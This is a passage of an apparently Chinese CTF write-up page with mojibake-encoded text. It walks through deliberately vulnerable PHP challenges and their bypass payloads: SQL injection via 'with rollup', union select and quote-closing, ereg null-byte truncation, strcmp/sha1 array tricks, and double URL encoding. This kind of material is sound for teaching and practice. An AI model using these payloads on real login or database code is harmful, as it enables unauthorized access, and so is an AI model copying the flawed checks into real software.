class="string">'ichunqiu'</span>);</span></span><br><span class="line"><span class="php">$a = base64_encode(gzcompress(serialize($a)));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $a</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="SQLæ³¨å…¥-with-rollupç»•è¿‡"><a href="#SQLæ³¨å…¥-with-rollupç»•è¿‡" class="headerlink" title="SQLæ³¨å…¥_with rollupç»•è¿‡"></a>SQLæ³¨å…¥_with rollupç»•è¿‡</h2><p>é¢˜ç›®åœ°å€: <a href="http://ctf5.shiyanbar.com/web/pcat" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat</a><br>åœ¨ç¬¬ä¸€å±‚çš„filteré‡Œé¢å°±è¿‡æ»¤äº†å¸¸ç”¨çš„SQLå…³é”®è¯ï¼Œæ‰€ä»¥å¸¸è§„çš„SQL æ³¨å…¥å°±ä¸è¡Œäº†ã€‚å¦‚æœè¾“å…¥äº†filteré‡Œé¢çš„è¯­å¥ï¼Œç½‘é¡µè¿”å›â€œæ°´å¯è½½èˆŸï¼Œäº¦å¯èµ›è‰‡ï¼â€<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' or <span class="number">1</span> limit <span class="number">1</span> offset <span class="number">0</span>#</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>' or <span class="number">1</span> limit <span class="number">1</span> offset <span class="number">1</span>#</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>' or <span class="number">1</span> limit <span class="number">1</span> offset <span class="number">2</span>#</span><br></pre></td></tr></table></figure></p><p>å‘ç°2#æ—¶è¿”å›â€œä¸€é¢—èµ›è‰‡ï¼â€ å…¶ä»–éƒ½æ˜¯â€œäº¦å¯èµ›è‰‡ï¼â€â€”â€”â€”â€“è¯´æ˜æ•°æ®åº“åªæœ‰ä¸¤æ¡ä¿¡æ¯<br>åˆ©ç”¨group by pwd with rollupåœ¨æŸ¥è¯¢ä¸­çš„ä¸€ä¸ªç‰¹ç‚¹ï¼Œä»–å¯ä»¥è¿”å›pwdæ‰€åœ¨çš„é‚£ä¸€æ¡è®°å½•ï¼Œé€šè¿‡limitæ§åˆ¶è¿”å›å“ªä¸€æ¡ï¼Œå› æ­¤ä»–ä¸å¯ä»¥è¿”å›å¤šæ¡ï¼Œä¸€æ—¦è¿”å›2æ¡åŠä»¥ä¸Šï¼Œpwdå°±ä¼šä¸ºç©ºï¼Œä½†åŒä¸€æ¡è®°å½•ä¸­çš„å…¶ä»–å­—æ®µåˆ™æ˜¯æ­£å¸¸çš„<br>é‚£ä¹ˆåˆ©ç”¨è¿™ä¸€ç‚¹ä»¤æŸ¥è¯¢ç»“æœä¸ºç©ºï¼Œæˆ‘ä»¬è¾“å…¥çš„pwdä¹Ÿä¸ºç©ºå€¼ï¼Œåˆ™æ„æˆäº†if(null==null)ä¸ºtrue<br>payloadï¼šâ€™ or 1=1 group by pwd with rollup limit 1 offset 2 #</p><h2 id="eregæ­£åˆ™-00æˆªæ–­"><a href="#eregæ­£åˆ™-00æˆªæ–­" class="headerlink" title="eregæ­£åˆ™%00æˆªæ–­"></a>eregæ­£åˆ™%00æˆªæ–­</h2><p>åœ°å€:<a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/more.php</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">  &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span></span><br><span class="line"><span class="php">   &#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>) <span class="comment">//strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</span></span></span><br><span class="line"><span class="php">      &#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span></span><br><span class="line"><span class="php">      &#125;</span></span><br><span class="line"><span class="php">      <span class="keyword">else</span></span></span><br><span class="line"><span class="php">      &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span></span><br><span class="line"><span class="php">       &#125;</span></span><br><span class="line"><span class="php">      &#125;</span></span><br><span class="line"><span class="php">     <span class="keyword">else</span></span></span><br><span class="line"><span class="php">     &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">      &#125;</span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>eregæœ‰ä¸¤ä¸ªæ¼æ´ï¼š<br>â‘ %00æˆªæ–­åŠé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸ</p><p>â‘¡å½“ntfä¸ºæ•°ç»„æ—¶å®ƒçš„è¿”å›å€¼ä¸æ˜¯FALSE<br>å¾—åˆ°æƒ³è¦å¾—åˆ°flagéœ€è¦ä¸‰ä¸ªæ¡ä»¶<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET['password']) ï¼=== <span class="literal">FALSE</span>å³æäº¤çš„passwordå¿…é¡»æ˜¯åªèƒ½æ˜¯ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ•°å­—ã€å¤§å°å†™å­—æ¯ã€‚</span><br><span class="line"><span class="number">2.</span>strlen($_GET['password']) &lt; <span class="number">8</span> &amp;&amp; $_GET['password'] &gt; <span class="number">9999999</span> æäº¤çš„passwordé•¿åº¦è¦å°äº<span class="number">8</span>å¹¶ä¸”å¤§å°è¦å¤§äº<span class="number">99999999</span></span><br><span class="line"><span class="number">3.</span> strpos ($_GET['password'], '*-*') !== <span class="literal">FALSE</span> passwordé‡Œå¿…é¡»è¦æœ‰â€™-â€™</span><br><span class="line"></span><br><span class="line">å› ä¸ºereg()å‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯¼è‡´æ­£åˆ™è¿‡æ»¤è¢«ç»•è¿‡,æ‰€ä»¥å¯ä»¥ç”¨%<span class="number">00</span>æ¥æˆªæ–­æ­£åˆ™åŒ¹é…</span><br><span class="line">ç¬¬äºŒä¸ªæ¡ä»¶é•¿åº¦å°äº<span class="number">8</span>å¤§å°å¤§äº<span class="number">99999999</span>å¯ä»¥ç”¨ç§‘å­¦è®¡æ•°æ³•æ¥ç»•è¿‡</span><br><span class="line"></span><br><span class="line">åˆ™æœ€åæ„é€ password=<span class="number">1e8</span>%<span class="number">00</span>*-*å³å¯å¾—åˆ°flag</span><br></pre></td></tr></table></figure></p><h2 id="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"><a href="#strcmpæ¯”è¾ƒå­—ç¬¦ä¸²" class="headerlink" title="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"></a>strcmpæ¯”è¾ƒå­—ç¬¦ä¸²</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;  </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) <span class="comment">//å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1å¤§äº str2è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">//æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span></span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>  </span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'No'</span>;  </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>int strcmp ( string $str1 , string $str2 )<br>å‚æ•° str1ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚str2ç¬¬äºŒä¸ªå­—ç¬¦ä¸²ã€‚<br>å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼›<br>å¦‚æœ str1 å¤§äº str2 è¿”å› &gt; 0ï¼›<br>å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0<br>å¯çŸ¥ï¼Œä¼ å…¥çš„æœŸæœ›ç±»å‹æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥éå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®çš„æ—¶å€™ï¼Œè¿™ä¸ªå‡½æ•°å°†ä¼šæœ‰æ€ä¹ˆæ ·çš„è¡Œä¸ºå‘¢ï¼Ÿå®é™…ä¸Šï¼Œå½“è¿™ä¸ªå‡½æ•°æ¥å—åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹ï¼Œè¿™ä¸ªå‡½æ•°å°†å‘ç”Ÿé”™è¯¯ï¼Œä½†æ˜¯åœ¨5.3ä¹‹å‰çš„phpä¸­ï¼Œæ˜¾ç¤ºäº†æŠ¥é”™çš„è­¦å‘Šä¿¡æ¯åï¼Œå°†return 0 !!!! ä¹Ÿå°±æ˜¯è™½ç„¶æŠ¥äº†é”™ï¼Œä½†å´åˆ¤å®šå…¶ç›¸ç­‰äº†ã€‚è¿™å¯¹äºä½¿ç”¨è¿™ä¸ªå‡½æ•°æ¥åšé€‰æ‹©è¯­å¥ä¸­çš„åˆ¤æ–­çš„ä»£ç æ¥è¯´ç®€ç›´æ˜¯ä¸€ä¸ªè‡´å‘½çš„æ¼æ´ï¼Œå½“ç„¶ï¼Œphpå®˜æ–¹åœ¨åé¢çš„ç‰ˆæœ¬ä¸­ä¿®å¤äº†è¿™ä¸ªæ¼æ´ï¼Œä½¿å¾—æŠ¥é”™çš„æ—¶å€™å‡½æ•°ä¸è¿”å›ä»»ä½•å€¼ã€‚strcmpåªä¼šå¤„ç†å­—ç¬¦ä¸²å‚æ•°ï¼Œå¦‚æœç»™ä¸ªæ•°ç»„çš„è¯å‘¢ï¼Œå°±ä¼šè¿”å›NULL,è€Œåˆ¤æ–­ä½¿ç”¨çš„æ˜¯==ï¼ŒNULL==0æ˜¯ bool(true)</p><h2 id="sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡"><a href="#sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡"></a>sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span></span><br><span class="line"><span class="php">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>===ä¼šæ¯”è¾ƒç±»å‹ï¼Œæ¯”å¦‚bool sha1()å‡½æ•°å’Œmd5()å‡½æ•°å­˜åœ¨ç€æ¼æ´ï¼Œsha1()å‡½æ•°é»˜è®¤çš„ä¼ å…¥å‚æ•°ç±»å‹æ˜¯å­—ç¬¦ä¸²å‹ï¼Œé‚£è¦æ˜¯ç»™å®ƒä¼ å…¥æ•°ç»„å‘¢ä¼šå‡ºç°é”™è¯¯ï¼Œä½¿sha1()å‡½æ•°è¿”å›é”™è¯¯ï¼Œä¹Ÿå°±æ˜¯è¿”å›falseï¼Œè¿™æ ·ä¸€æ¥===è¿ç®—ç¬¦å°±å¯ä»¥å‘æŒ¥ä½œç”¨äº†ï¼Œéœ€è¦æ„é€ usernameå’Œpasswordæ—¢ä¸ç›¸ç­‰ï¼ŒåˆåŒæ ·æ˜¯æ•°ç»„ç±»å‹</p><p>?name[]=a&amp;password[]=b</p><h2 id="SESSIONéªŒè¯ç»•è¿‡"><a href="#SESSIONéªŒè¯ç»•è¿‡" class="headerlink" title="SESSIONéªŒè¯ç»•è¿‡"></a>SESSIONéªŒè¯ç»•è¿‡</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'password'</span>] == $_SESSION[<span class="string">'password'</span>])</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span> (<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'&lt;p&gt;Wrong guess.&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">mt_srand((microtime() ^ rand(<span class="number">1</span>, <span class="number">10000</span>)) % rand(<span class="number">1</span>, <span class="number">10000</span>) + rand(<span class="number">1</span>, <span class="number">10000</span>));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1/Php_Bug/08.php?password=" target="_blank" rel="noopener">http://127.0.0.1/Php_Bug/08.php?password=</a></p><p>åˆ é™¤cookiesæˆ–è€…åˆ é™¤cookiesçš„å€¼</p><h2 id="å¯†ç md5æ¯”è¾ƒç»•è¿‡"><a href="#å¯†ç md5æ¯”è¾ƒç»•è¿‡" class="headerlink" title="å¯†ç md5æ¯”è¾ƒç»•è¿‡"></a>å¯†ç md5æ¯”è¾ƒç»•è¿‡</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">//é…ç½®æ•°æ®åº“</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[user] &amp;&amp; <span class="variable">$_POST</span>[pass]) &#123;</span><br><span class="line">    <span class="variable">$conn</span> = mysql_connect(<span class="string">"********, "</span>*****<span class="string">", "</span>********");</span><br><span class="line">    mysql_select_db(<span class="string">"phpformysql"</span>) or die(<span class="string">"Could not select database"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">        die(<span class="string">"Connection failed: "</span> . mysql_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//èµ‹å€¼</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[user];</span><br><span class="line"><span class="variable">$pass</span> = md5(<span class="variable">$_POST</span>[pass]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//sqlè¯­å¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// select pw from php where user='' union select 'e10adc3949ba59abbe56e057f20f883e' #</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ?user=' union select 'e10adc3949ba59abbe56e057f20f883e' #&amp;pass=123456</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select pw from php where user='$user'"</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$query</span>) &#123;</span><br><span class="line">    printf(<span class="string">"Error: %s\n"</span>, mysql_error(<span class="variable">$conn</span>));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$query</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pw"];</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="variable">$row</span>[pw]) &amp;&amp; (!strcasecmp(<span class="variable">$pass</span>, <span class="variable">$row</span>[pw]))) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1 å¤§äº str2 è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    echo <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    echo(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç”¨union selectæ¥è¿”å›ä¸€ä¸ªå·²çŸ¥æ˜æ–‡çš„md5ï¼Œpayloadï¼š<br>user=â€™ union select â€˜202cb962ac59075b964b07152d234b70â€™#&amp;pass=123</p><h2 id="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"></a>urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line">  echo(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  echo <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>?id=%2568ackerDJ</p><h2 id="sqlé—­åˆç»•è¿‡"><a href="#sqlé—­åˆç»•è¿‡" class="headerlink" title="sqlé—­åˆç»•è¿‡"></a>sqlé—­åˆç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn = mysql_connect(<span class="string">"*******"</span>, <span class="string">"****"</span>, <span class="string">"****"</span>);</span><br><span class="line">    mysql_select_db(<span class="string">"****"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//select user from php where (user='admin')#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//exp:admin')#</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select user from php where (user='$user') and (pw='$pass')"</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$query) &#123;</span><br><span class="line">    printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pw"];</span></span><br><span class="line">  <span class="keyword">if</span>($row[<span class="string">'user'</span>]==<span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: *********** &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($row[<span class="string">'user'</span>] != <span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ expé—­åˆç»•è¿‡ adminâ€™)#</p><h2 id="X-Forwarded-Forç»•è¿‡æŒ‡å®šIPåœ°å€"><a href="#X-Forwarded-Forç»•è¿‡æŒ‡å®šIPåœ°å€" class="headerlink" title="X-Forwarded-Forç»•è¿‡æŒ‡å®šIPåœ°å€"></a>X-Forwarded-Forç»•è¿‡æŒ‡å®šIPåœ°å€</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</span></span><br><span class="line"><span class="php">    $cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]))</span></span><br><span class="line"><span class="php">    $cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</span></span><br><span class="line"><span class="php">    $cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span></span><br><span class="line"><span 